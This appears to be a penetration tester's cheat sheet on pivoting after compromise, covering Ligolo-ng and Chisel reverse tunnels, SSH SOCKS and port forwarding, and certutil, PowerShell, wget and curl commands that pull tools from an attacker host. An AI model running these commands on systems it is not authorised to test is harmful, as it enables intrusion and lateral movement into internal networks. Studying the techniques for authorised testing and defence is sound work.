
# 04_Pivoting_and_Tunneling

## 1. Ligolo-ng
Ligolo-ng is a high-performance tunneling tool that uses a TUN interface. It allows for direct interaction with internal subnets without the need for proxychains.

### 1a. Kali Setup
Run these commands to create the TUN interface and start the listener:
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
````

### 1b. Target Execution

Transfer the agent to the compromised host and connect back to your Kali IP:

- Windows: `.\agent.exe -connect <KALI_IP>:11601 -ignore-cert`
- Linux: `./agent -connect <KALI_IP>:11601 -ignore-cert`

### 1c. Finalize Route

Inside the ligolo interactive proxy session:

1. Type `session` and select the appropriate session ID.
2. Type `start`.
3. In a new Kali terminal, add the route to the internal subnet:


```Bash
sudo ip route add <INTERNAL_SUBNET/24> dev ligolo
```

---

## 2. Chisel

Chisel is a reliable TCP/UDP tunnel over HTTP. It is a primary alternative when TUN interfaces are not viable.

### 2a. SOCKS5 Proxy (Standard Pivot)

- On Kali (Server): `./chisel server -p 8000 --reverse`
- On Target (Client): `./chisel client <KALI_IP>:8000 R:socks`
- Configuration: Edit `/etc/proxychains4.conf` to include `socks5 127.0.0.1 1080`.

### 2b. Remote Port Forward

Forward a port from an internal machine through the pivot back to Kali:

```bash
./chisel client <KALI_IP>:8000 R:<KALI_PORT>:127.0.0.1:<LOCAL_PORT>
```

---

## 3. SSH Tunneling

Utilized when SSH credentials for a Linux target are available.

### 3a. Dynamic Port Forwarding (SOCKS)

`ssh -N -D 9050 <USER>@<TARGET_IP>`

- Note: Add `socks4 127.0.0.1 9050` to `/etc/proxychains4.conf`.

### 3b. Local Port Forwarding

Access a specific internal service locally: `ssh -L <KALI_PORT>:127.0.0.1:<TARGET_PORT> <USER>@<TARGET_IP>`

---

## 4. File Transfer Methods

Methods to move binaries (agent.exe, chisel) to the target machine.

### 4a. Python Web Server (Kali)

`python3 -m http.server 80`

### 4b. Windows Download Commands

- PowerShell: `iwr -uri http://<KALI_IP>/agent.exe -outfile agent.exe`
- Certutil: `certutil -urlcache -f http://<KALI_IP>/chisel.exe chisel.exe`

### 4c. Linux Download Commands

- Wget: `wget http://<KALI_IP>/agent`
- Curl: `curl http://<KALI_IP>/agent -o agent`